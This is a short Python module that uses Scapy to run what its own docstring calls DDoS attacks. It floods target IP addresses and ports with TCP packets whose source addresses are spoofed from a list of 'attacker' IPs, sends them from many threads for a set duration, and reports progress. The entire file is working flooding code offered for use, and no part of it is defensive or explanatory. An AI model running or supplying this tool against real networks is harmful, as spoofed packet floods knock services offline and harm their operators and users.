#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from common_utils import menu_utils
import config_params
import time
import random

""" This module uses Scapy to perform DDoS attacks """


def _send_packet(attacker_ip, ip, port):
    pkt = IP(src=attacker_ip, dst=ip) / TCP(sport=port, dport=port)
    send(pkt, inter=config_params.DDOS_INTERPACKET_INTERVAL, verbose=False)


def ddos_attack(attackers_ips, ips, ports, duration):

    menu_utils.header('DDoS attack, target IPs: %s ' % ips)
    menu_utils.mixed_info("Attackers IPs: ", attackers_ips)
    menu_utils.mixed_info("Ports: ", ports)
    menu_utils.mixed_info("Duration: ", "%s seconds" % duration)

    menu_utils.highlighted_info("Progress:\n")
    t0 = time.time()
    pkt_counter = 0
    thread_list = []

    while time.time() < (t0 + duration):

        chosen_attacker_ip = random.choice(attackers_ips)
        chosen_ip = random.choice(ips)
        chosen_port = random.choice(ports)

        t = threading.Thread(target=_send_packet, args=(chosen_attacker_ip, chosen_ip, chosen_port,))
        t.start()
        thread_list.append(t)

        if pkt_counter % config_params.MAX_NUMBER_THREADS == 0:

            for thread in thread_list:
                thread.join()  # closing threads
            thread_list = []

        pkt_counter += 1
        additional_info = "attack: %s -> %s:%s" % (chosen_attacker_ip, chosen_ip, chosen_port)
        menu_utils.progress_bar(int(100*(time.time() - t0)/duration),
                                config_params.DISPLAY["progress_bar_width"], additional_info)

    menu_utils.super_highlighted_info("\n%s DDoS packets successfully sent" % pkt_counter)








